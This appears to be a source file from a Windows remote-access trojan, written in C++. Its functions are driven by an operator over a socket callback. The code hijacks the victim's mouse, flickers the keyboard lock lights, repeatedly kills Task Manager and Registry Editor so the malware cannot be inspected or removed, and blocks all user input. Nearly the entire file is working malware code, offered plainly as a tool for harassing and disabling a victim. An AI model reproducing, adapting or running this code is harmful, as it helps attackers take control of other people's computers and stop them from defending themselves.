// threads/functions to fuck with the user

bool fuckWithMouse_bool = false;
int fuckWithMouse(SOCKET* mainCallback) {
	
	fuckWithMouse_bool = true;
	
	// screen size
	HDC hScreenDC = CreateDC("DISPLAY", NULL, NULL, NULL);
	int width = GetDeviceCaps(hScreenDC, HORZRES);
	int height = GetDeviceCaps(hScreenDC, VERTRES);
	
	float r = 100;
	float cx = (width  / 2) - r;
	float cy = (height / 2) - r;
	
	int num_segments = 100;
	
	echoNsend(*mainCallback, "[+] starting mouse circles loop...");
	
	while(fuckWithMouse_bool) {
		
		for(int i = 0; i < num_segments; i++) {
			
			float theta = 2.0f * 3.1415926f * float(i) / float(num_segments);
	
			float x = r * cosf(theta);
			float y = r * sinf(theta);
	
			SetCursorPos(x + cx, y + cy);
			
			Sleep(10);
			
			if (!fuckWithMouse_bool) { break; }
		}
	}
	
	echoNsend(*mainCallback, "[*] stopped mouse circles loop");
	
	return 0;
}

bool keyboardDisco_bool = false;
int keyboardDisco(SOCKET* mainCallback) {
	
	keyboardDisco_bool = true;
	
	auto skey = [](const int& vkey) {
		INPUT input; 
		input.type = INPUT_KEYBOARD;
		input.ki.wScan = MapVirtualKey(vkey, MAPVK_VK_TO_VSC);
		input.ki.time = 0;
		input.ki.dwExtraInfo = 0;
		input.ki.wVk = vkey;
		
		input.ki.dwFlags = 0; // KEYEVENTF_KEYDOWN existn't
		SendInput(1, &input, sizeof(INPUT));
		input.ki.dwFlags = KEYEVENTF_KEYUP;
		SendInput(1, &input, sizeof(INPUT));
	};
	
	echoNsend(*mainCallback, "[+] starting keyboard disco loop...");
	
	#define delaySleep 1000
	while(keyboardDisco_bool) {
		
		skey(VK_NUMLOCK);
		Sleep(delaySleep);
		skey(VK_CAPITAL);
		Sleep(delaySleep);
		skey(VK_SCROLL);
		Sleep(delaySleep);
	}
	
	echoNsend(*mainCallback, "[*] stopped keyboard disco loop");
	
	return 0;
}

bool disableADMIN_bool = false;
int disableADMIN(SOCKET* mainCallback) {
	
	disableADMIN_bool = true;
	
	auto TerminateProcessEx = [](DWORD dwProcessId, UINT uExitCode)
	{
		DWORD dwDesiredAccess = PROCESS_TERMINATE;
		BOOL  bInheritHandle  = FALSE;
		HANDLE hProcess = OpenProcess(dwDesiredAccess, bInheritHandle, dwProcessId);
		if (hProcess == NULL)
			return FALSE;
	
		BOOL result = TerminateProcess(hProcess, uExitCode);
	
		CloseHandle(hProcess);
	
		return result;
	};
	
	while (disableADMIN_bool) {
		
		//DWORD pID = 0;
		
		// retrieve process ID
		HANDLE thSnapShot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
		if (thSnapShot == INVALID_HANDLE_VALUE) { echoNsend(*mainCallback, "error: unable to create toolhelp snapshot", true); disableADMIN_bool = false; return 1; } 
		
		PROCESSENTRY32 pe;
		pe.dwSize = sizeof(PROCESSENTRY32);
		const char* input1 = "taskmgr.exe";
		const char* input2 = "regedit.exe";
		BOOL retval = Process32First(thSnapShot, &pe);
		while (retval) {
			
			// check if taskmgr
			if (StrStrI(pe.szExeFile, input1)) {
				echoNsend(*mainCallback, ("found process: \"" + std::string(pe.szExeFile) + "\" (" + std::to_string(pe.th32ProcessID) + ")"));
				UINT uExitCode = 0;
				if (TerminateProcessEx(pe.th32ProcessID, uExitCode)) { echoNsend(*mainCallback, "killed it");         }
				else                                                 { echoNsend(*mainCallback, "failed to kill it"); }
			}
			
			// check if regedit
			if (StrStrI(pe.szExeFile, input2)) {
				echoNsend(*mainCallback, ("found process: \"" + std::string(pe.szExeFile) + "\" (" + std::to_string(pe.th32ProcessID) + ")"));
				UINT uExitCode = 0;
				if (TerminateProcessEx(pe.th32ProcessID, uExitCode)) { echoNsend(*mainCallback, "killed it");         }
				else                                                 { echoNsend(*mainCallback, "failed to kill it"); }
			}
			
			retval = Process32Next(thSnapShot, &pe);
		}
		
		Sleep(1000);
	}
	
	return 0;
}

bool blockInput_bool = false;
int blockInput(SOCKET* mainCallback) {
	
	blockInput_bool = true;
	while (blockInput_bool) {
		if (BlockInput(TRUE)) { echoNsend(*mainCallback, "[+] blocked user input"); }
		Sleep(100);
	}
	
	if (BlockInput(FALSE)) { echoNsend(*mainCallback, "[+] unblocked user input"); }
	return 0;
}